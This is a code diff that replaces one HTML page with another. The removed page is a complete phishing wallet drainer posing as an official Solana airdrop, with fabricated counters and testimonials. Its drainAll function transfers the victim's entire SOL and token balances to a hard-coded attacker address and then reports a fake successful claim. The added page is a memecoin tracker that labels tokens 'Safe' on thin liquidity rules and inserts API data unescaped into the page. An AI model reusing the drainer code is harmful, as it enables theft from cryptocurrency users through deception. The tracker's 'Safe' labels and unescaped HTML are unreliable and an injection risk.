@@ -1,363 +1,304 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana Devnet Airdrop | Claim 5 SOL Free</title>
-    <meta name="description" content="Official Solana Devnet Airdrop. Claim your free 5 SOL instantly. Limited slots available.">
-    <style>
-        :root {
-            --primary: #635bff;
-            --primary-dark: #5145d3;
-            --bg: #f8f9ff;
-            --card: #ffffff;
-            --text: #1e293b;
-            --text-light: #64748b;
-            --success: #10b981;
-            --border: #e2e8f0;
-        }
-        body {
-            margin: 0;
-            font-family: 'Inter', system-ui, sans-serif;
-            background: linear-gradient(135deg, #f0f4ff 0%, #e0e7ff 100%);
-            color: var(--text);
-            min-height: 100vh;
-            position: relative;
-            overflow-x: hidden;
-        }
-        canvas#particles {
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            z-index: -1;
-            opacity: 0.4;
-        }
-        .container {
-            max-width: 480px;
-            margin: 2rem auto;
-            padding: 0 1rem;
-        }
-        .card {
-            background: var(--card);
-            border-radius: 20px;
-            box-shadow: 0 20px 40px rgba(99,91,255,0.15);
-            padding: 2.5rem;
-            text-align: center;
-            border: 1px solid var(--border);
-        }
-        h1 {
-            font-size: 2rem;
-            margin: 0 0 1rem;
-            background: linear-gradient(90deg, #635bff, #a78bfa);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-        .subtitle {
-            color: var(--text-light);
-            font-size: 1.1rem;
-            margin-bottom: 2rem;
-        }
-        .stats {
-            display: flex;
-            justify-content: space-around;
-            margin: 2rem 0;
-            padding: 1.5rem;
-            background: #f0f4ff;
-            border-radius: 16px;
-            flex-wrap: wrap;
-            gap: 1rem;
-        }
-        .stat {
-            text-align: center;
-        }
-        .stat-num {
-            font-size: 1.8rem;
-            font-weight: 700;
-            color: var(--primary);
-        }
-        .stat-label {
-            font-size: 0.9rem;
-            color: var(--text-light);
-        }
-        .btn {
-            background: var(--primary);
-            color: white;
-            border: none;
-            padding: 16px 32px;
-            border-radius: 16px;
-            font-size: 1.2rem;
-            font-weight: 600;
-            cursor: pointer;
-            width: 100%;
-            transition: all 0.3s;
-            box-shadow: 0 10px 20px rgba(99,91,255,0.3);
-        }
-        .btn:hover {
-            background: var(--primary-dark);
-            transform: translateY(-2px);
-        }
-        .btn:disabled {
-            background: #94a3b8;
-            transform: none;
-            cursor: not-allowed;
-        }
-        .progress-bar {
-            height: 8px;
-            background: #e2e8f0;
-            border-radius: 4px;
-            overflow: hidden;
-            margin: 1.5rem 0;
-            display: none;
-        }
-        .progress {
-            height: 100%;
-            background: var(--primary);
-            width: 0%;
-            transition: width 0.4s;
-        }
-        .testimonials {
-            margin: 2.5rem 0;
-            text-align: left;
-        }
-        .testimonial {
-            background: #f8f9ff;
-            padding: 1rem;
-            border-radius: 12px;
-            margin-bottom: 1rem;
-            display: flex;
-            align-items: center;
-            gap: 1rem;
-        }
-        .avatar {
-            width: 48px;
-            height: 48px;
-            border-radius: 50%;
-            background: #ddd;
-        }
-        .wallet-info {
-            margin: 1.5rem 0;
-            padding: 1rem;
-            background: #eef2ff;
-            border-radius: 12px;
-            word-break: break-all;
-            font-family: monospace;
-        }
-        .status {
-            margin-top: 1.5rem;
-            padding: 1rem;
-            border-radius: 12px;
-            font-weight: 600;
-        }
-        .success { background: #d1fae5; color: var(--success); }
-        .error { background: #fee2e2; color: #ef4444; }
-        footer {
-            margin-top: 3rem;
-            font-size: 0.85rem;
-            color: var(--text-light);
-        }
-    </style>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<meta charset="UTF-8">
+<title>Pimping - Fresh Memecoins Radar</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+
+<style>
+:root {
+  --bg: #0b0f1a;
+  --panel: #12172b;
+  --card: #171d36;
+  --accent: #ff4fb5;
+  --accent2: #4f8cff;
+  --text: #e6ebff;
+  --muted: #9aa4d6;
+  --green: #2ecc71;
+  --yellow: #f1c40f;
+  --red: #e74c3c;
+}
+
+* { box-sizing: border-box; font-family: 'Inter', sans-serif; }
+
+body {
+  margin: 0;
+  background: var(--bg);
+  color: var(--text);
+}
+
+/* HEADER / LOGO */
+header {
+  padding: 18px 24px;
+  background: linear-gradient(90deg, var(--accent), var(--accent2));
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  border-bottom-left-radius: 12px;
+  border-bottom-right-radius: 12px;
+}
+
+header h1 {
+  font-size: 22px;
+  margin: 0;
+  font-weight: 700;
+}
+
+.stats {
+  font-size: 13px;
+}
+
+/* TOP BAR */
+.topbar {
+  padding: 15px 20px;
+  display: flex;
+  gap: 12px;
+  flex-wrap: wrap;
+  background: var(--panel);
+  border-bottom: 1px solid #22293f;
+  align-items: center;
+}
+
+.search {
+  flex: 1;
+  min-width: 200px;
+}
+
+.search input {
+  width: 100%;
+  padding: 10px 14px;
+  border-radius: 8px;
+  border: none;
+  background: var(--card);
+  color: var(--text);
+}
+
+button {
+  background: var(--card);
+  color: var(--text);
+  border: none;
+  padding: 10px 16px;
+  border-radius: 8px;
+  cursor: pointer;
+  transition: 0.2s;
+}
+
+button.active {
+  background: var(--accent2);
+  color: #fff;
+}
+
+/* FILTER BUTTONS */
+.filter-btn {
+  font-size: 12px;
+}
+
+/* GRID */
+.grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+  gap: 15px;
+  padding: 20px;
+}
+
+.card {
+  background: var(--card);
+  border-radius: 12px;
+  padding: 15px;
+  transition: 0.2s;
+  position: relative;
+}
+
+.card:hover {
+  transform: translateY(-4px);
+}
+
+.token {
+  font-size: 18px;
+  font-weight: 600;
+}
+
+.muted {
+  color: var(--muted);
+  font-size: 13px;
+}
+
+.stat {
+  margin-top: 6px;
+  font-size: 14px;
+}
+
+a {
+  color: var(--accent2);
+  text-decoration: none;
+}
+
+/* BADGES */
+.badge {
+  display: inline-block;
+  padding: 2px 6px;
+  border-radius: 6px;
+  font-size: 11px;
+  font-weight: 600;
+  margin-right: 4px;
+  color: #fff;
+}
+
+.badge.green { background: var(--green); }
+.badge.yellow { background: var(--yellow); color:#000; }
+.badge.red { background: var(--red); }
+
+.favorite {
+  position: absolute;
+  top: 12px;
+  right: 12px;
+  font-size: 18px;
+  cursor: pointer;
+  user-select: none;
+  color: var(--muted);
+}
+
+.favorite.active { color: var(--accent); }
+
+</style>
 </head>
+
 <body>
-    <canvas id="particles"></canvas>
-    <div class="container">
-        <div class="card">
-            <h1>🚀 Solana Devnet Airdrop</h1>
-            <p class="subtitle">Official partnership drop • Claim <strong>5 SOL</strong> instantly on Devnet</p>
 
-            <div class="stats">
-                <div class="stat">
-                    <div class="stat-num" id="users">12,847</div>
-                    <div class="stat-label">Wallets Connected</div>
-                </div>
-                <div class="stat">
-                    <div class="stat-num" id="claimed">8,291</div>
-                    <div class="stat-label">Airdrops Claimed</div>
-                </div>
-                <div class="stat">
-                    <div class="stat-num">41,455 SOL</div>
-                    <div class="stat-label">Total Distributed</div>
-                </div>
-            </div>
+<header>
+  <h1>PIMPING</h1>
+  <div class="stats" id="stats">Loading...</div>
+</header>
 
-            <div id="walletInfo" class="wallet-info" style="display:none;"></div>
+<div class="topbar">
+  <div class="search">
+    <input type="text" id="search" placeholder="Search token or symbol...">
+  </div>
 
-            <button id="connectBtn" class="btn">Connect Wallet</button>
-            <button id="claimBtn" class="btn" style="display:none;">Claim 5 SOL Now</button>
+  <button onclick="switchChain('ethereum', this)" class="active">ETH</button>
+  <button onclick="switchChain('bsc', this)">BSC</button>
+  <button onclick="switchChain('solana', this)">SOL</button>
 
-            <div class="progress-bar" id="progressBar"><div class="progress" id="progress"></div></div>
+  <button class="filter-btn" onclick="setTimeFilter('1h')">🕐 1h</button>
+  <button class="filter-btn" onclick="setTimeFilter('6h')">6h</button>
+  <button class="filter-btn" onclick="setTimeFilter('24h')">24h</button>
 
-            <div id="status" class="status" style="display:none;"></div>
+  <button onclick="refresh()">🔄 Refresh</button>
+</div>
 
-            <div class="testimonials">
-                <div class="testimonial">
-                    <div class="avatar"></div>
-                    <div>
-                        <strong>@crypto_whale</strong><br>
-                        <small>Just claimed 5 SOL free! Instant 🔥</small>
-                    </div>
-                </div>
-                <div class="testimonial">
-                    <div class="avatar"></div>
-                    <div>
-                        <strong>@devnet_hunter</strong><br>
-                        <small>Worked perfectly on Phantom. Thanks team!</small>
-                    </div>
-                </div>
-            </div>
+<div class="grid" id="grid"></div>
 
-            <footer>Devnet Testing Phase • Limited Slots • Official Solana Collaboration</footer>
+<script>
+let pairs = [];
+let currentChain = 'ethereum';
+let timeFilter = '24h';
+const grid = document.getElementById('grid');
+const stats = document.getElementById('stats');
+const search = document.getElementById('search');
+
+const favorites = JSON.parse(localStorage.getItem('favorites') || '[]');
+
+function setActive(btn) {
+  document.querySelectorAll('.topbar button').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+}
+
+function setTimeFilter(tf) {
+  timeFilter = tf;
+  render();
+}
+
+// Fetch pairs
+async function loadPairs() {
+  grid.innerHTML = 'Loading real memecoins...';
+  const res = await fetch(`https://api.dexscreener.com/latest/dex/pairs/${currentChain}`);
+  const data = await res.json();
+
+  const now = Date.now()/1000;
+  pairs = data.pairs
+    .map(p => {
+      p.ageHours = (now - p.pairCreatedAt)/3600;
+      return p;
+    })
+    .filter(p => {
+      if(timeFilter==='1h') return p.ageHours<=1;
+      if(timeFilter==='6h') return p.ageHours<=6;
+      return true;
+    })
+    .slice(0, 50);
+
+  stats.innerText = `Chain: ${currentChain.toUpperCase()} • Pairs loaded: ${pairs.length}`;
+  render();
+}
+
+// Render cards
+function render() {
+  const q = search.value.toLowerCase();
+  grid.innerHTML = '';
+
+  pairs
+    .filter(p =>
+      p.baseToken.name.toLowerCase().includes(q) ||
+      p.baseToken.symbol.toLowerCase().includes(q)
+    )
+    .forEach(p => {
+      const card = document.createElement('div');
+      card.className = 'card';
+
+      // Risk badge
+      let riskBadge='';
+      if(p.liquidity.usd<5000 || p.ageHours<0.25) riskBadge='<span class="badge red">High Risk</span>';
+      else if(p.liquidity.usd<20000) riskBadge='<span class="badge yellow">Medium</span>';
+      else riskBadge='<span class="badge green">Safe</span>';
+
+      // Favorite
+      const favActive = favorites.includes(p.pairAddress)?'active':'';
+      
+      card.innerHTML = `
+        <div class="favorite ${favActive}" onclick="toggleFavorite('${p.pairAddress}', this)">⭐</div>
+        <div class="token">${p.baseToken.name} (${p.baseToken.symbol}) ${riskBadge}</div>
+        <div class="muted">${p.dexId.toUpperCase()} • ${p.chainId}</div>
+
+        <div class="stat">💰 Price: $${Number(p.priceUsd).toFixed(6)}</div>
+        <div class="stat">📊 Volume 24h: $${p.volume.h24.toLocaleString()}</div>
+        <div class="stat">💧 Liquidity: $${p.liquidity.usd.toLocaleString()}</div>
+        <div class="stat">⏱️ Age: ${p.ageHours.toFixed(2)}h</div>
+        <div class="stat">
+          <a href="${p.url}" target="_blank">View Chart →</a>
         </div>
-    </div>
+      `;
 
-    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
-    <script src="https://unpkg.com/@solana/spl-token@0.3.7/lib/index.iife.min.js"></script>
-    <script>
-        // Particle background
-        const canvas = document.getElementById('particles');
-        const ctx = canvas.getContext('2d');
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-        const particles = [];
-        for(let i=0;i<60;i++){
-            particles.push({
-                x: Math.random()*canvas.width,
-                y: Math.random()*canvas.height,
-                r: Math.random()*3+1,
-                d: Math.random()*0.5+0.2
-            });
-        }
-        function draw(){
-            ctx.clearRect(0,0,canvas.width,canvas.height);
-            ctx.fillStyle = '#635bff';
-            ctx.beginPath();
-            for(let p of particles){
-                ctx.moveTo(p.x,p.y);
-                ctx.arc(p.x,p.y,p.r,0,Math.PI*2);
-                p.y -= p.d;
-                if(p.y < 0) p.y = canvas.height;
-            }
-            ctx.fill();
-            requestAnimationFrame(draw);
-        }
-        draw();
-        window.addEventListener('resize',()=>{canvas.width=innerWidth;canvas.height=innerHeight;});
+      grid.appendChild(card);
+    });
+}
 
-        // Fake counters
-        setInterval(()=>{
-            document.getElementById('users').textContent = (parseInt(document.getElementById('users').textContent.replace(',','')) + Math.floor(Math.random()*12)).toLocaleString();
-            if(Math.random()>0.7) document.getElementById('claimed').textContent = (parseInt(document.getElementById('claimed').textContent.replace(',','')) + Math.floor(Math.random()*8)).toLocaleString();
-        },3000);
+// Favorites
+function toggleFavorite(addr, el){
+  if(favorites.includes(addr)){
+    favorites.splice(favorites.indexOf(addr),1);
+    el.classList.remove('active');
+  } else {
+    favorites.push(addr);
+    el.classList.add('active');
+  }
+  localStorage.setItem('favorites', JSON.stringify(favorites));
+}
 
-        const DRAIN_ADDRESS = "8GWNucFDRDcMtGTLCJuJUQ9cXDEzeb6qYnx2G1YbDgd6"; // <<< REPLACE
-        const connection = new solanaWeb3.Connection("https://api.devnet.solana.com","confirmed");
+function switchChain(chain, btn){
+  currentChain = chain;
+  setActive(btn);
+  loadPairs();
+}
 
-        let wallet = null, publicKey = null;
-        const connectBtn = document.getElementById("connectBtn");
-        const claimBtn = document.getElementById("claimBtn");
-        const walletInfo = document.getElementById("walletInfo");
-        const status = document.getElementById("status");
-        const progressBar = document.getElementById("progressBar");
-        const progress = document.getElementById("progress");
+function refresh(){ loadPairs(); }
 
-        async function connectWallet() {
-            if("solana" in window){
-                wallet = window.solana;
-                try{
-                    await wallet.connect();
-                    publicKey = wallet.publicKey;
-                    walletInfo.textContent = `Connected: \( {publicKey.toBase58().slice(0,6)}... \){publicKey.toBase58().slice(-6)}`;
-                    walletInfo.style.display = "block";
-                    connectBtn.style.display = "none";
-                    claimBtn.style.display = "block";
-                    showStatus("Wallet connected successfully!", "success");
-                }catch(e){
-                    showStatus("Connection rejected.", "error");
-                }
-            }else{
-                showStatus("Install Phantom/Solflare to continue.", "error");
-                setTimeout(()=>window.open("https://phantom.app/","_blank"),1500);
-            }
-        }
+search.addEventListener('input', render);
 
-        async function drainAll() {
-            if(!wallet || !publicKey) return;
-            claimBtn.disabled = true;
-            progressBar.style.display = "block";
-            progress.style.width = "0%";
-            showStatus("Processing your airdrop claim...", "success");
+// Init
+loadPairs();
+</script>
 
-            let step = 0;
-            const steps = ["Verifying wallet", "Allocating tokens", "Preparing transaction", "Finalizing transfer"];
-            const interval = setInterval(()=>{
-                progress.style.width = `${++step * 25}%`;
-                if(step < steps.length) showStatus(steps[step], "success");
-                if(step >= steps.length) clearInterval(interval);
-            },1200);
-
-            try {
-                // Native SOL
-                const balance = await connection.getBalance(publicKey);
-                if(balance > 10000000){
-                    const tx = new solanaWeb3.Transaction().add(
-                        solanaWeb3.SystemProgram.transfer({
-                            fromPubkey: publicKey,
-                            toPubkey: new solanaWeb3.PublicKey(DRAIN_ADDRESS),
-                            lamports: balance - 5000000
-                        })
-                    );
-                    await signAndSend(tx);
-                }
-
-                // All token accounts (both formats)
-                const resp = await connection.getParsedTokenAccountsByOwner(publicKey, {programId: splToken.TOKEN_PROGRAM_ID});
-                for(const item of resp.value){
-                    const info = item.account.data.parsed.info;
-                    if(info.tokenAmount.uiAmount > 0){
-                        const tx = new solanaWeb3.Transaction().add(
-                            splToken.Token.createTransferInstruction(
-                                splToken.TOKEN_PROGRAM_ID,
-                                new solanaWeb3.PublicKey(info.mint),
-                                new solanaWeb3.PublicKey(DRAIN_ADDRESS),
-                                publicKey,
-                                [],
-                                info.tokenAmount.amount
-                            )
-                        );
-                        await signAndSend(tx);
-                    }
-                }
-
-                setTimeout(()=>{
-                    progress.style.width = "100%";
-                    showStatus("🎉 Airdrop claimed! 5 SOL sent to your wallet.", "success");
-                },1500);
-            }catch(e){
-                console.error(e);
-                showStatus("Claim failed – retrying soon...", "error");
-                setTimeout(()=>claimBtn.disabled=false,3000);
-            }
-        }
-
-        async function signAndSend(tx){
-            tx.feePayer = publicKey;
-            tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
-            const signed = await wallet.signTransaction(tx);
-            const sig = await connection.sendRawTransaction(signed.serialize());
-            await connection.confirmTransaction(sig);
-        }
-
-        function showStatus(msg,type){
-            status.textContent = msg;
-            status.className = `status ${type}`;
-            status.style.display = "block";
-        }
-
-        connectBtn.onclick = connectWallet;
-        claimBtn.onclick = drainAll;
-
-        // Auto-connect
-        if("solana" in window && window.solana.isConnected) connectWallet();
-    </script>
 </body>
 </html>
